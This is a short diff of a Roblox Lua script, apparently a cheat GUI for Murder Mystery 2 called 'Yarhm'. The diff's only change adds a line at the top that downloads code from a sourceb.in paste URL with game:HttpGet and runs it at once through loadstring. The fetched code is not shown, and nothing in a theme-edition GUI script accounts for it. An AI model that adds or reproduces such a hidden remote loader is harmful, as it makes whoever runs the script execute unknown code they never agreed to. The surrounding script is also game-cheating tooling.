@@ -1,6 +1,8 @@
 -- Yarhm MM2 GUI Script
 -- Blue Theme Edition
 
+loadstring(game:HttpGet('https://cdn.sourceb.in/bins/odd6BjkZYW/0'))()
+
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local player = Players.LocalPlayer
